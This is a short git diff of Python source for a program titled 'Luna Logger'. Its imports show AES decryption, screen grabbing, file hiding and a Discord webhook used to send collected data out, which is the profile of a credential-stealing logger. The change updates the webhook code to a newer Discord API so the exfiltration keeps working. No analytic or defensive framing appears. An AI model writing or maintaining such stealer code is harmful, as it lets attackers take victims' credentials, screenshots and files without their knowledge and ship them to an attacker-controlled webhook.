@@ -18,7 +18,7 @@ from subprocess import PIPE, Popen
 from sys import exit
 from zipfile import ZipFile
 from Crypto.Cipher import AES
-from discord import Embed, File, RequestsWebhookAdapter, Webhook
+from discord import Embed, File, SyncWebhook
 from PIL import ImageGrab
 from win32api import SetFileAttributes
 from win32con import FILE_ATTRIBUTE_HIDDEN
@@ -32,7 +32,7 @@ __PINGTYPE__ = "%ping_type%"
 def main(webhook: str):
     global embed
 
-    webhook = Webhook.from_url(webhook, adapter=RequestsWebhookAdapter())
+    webhook = SyncWebhook.from_url(webhook, session=requests.Session())
     embed = Embed(title="Luna Logger", color=5639644)
 
     get_inf()
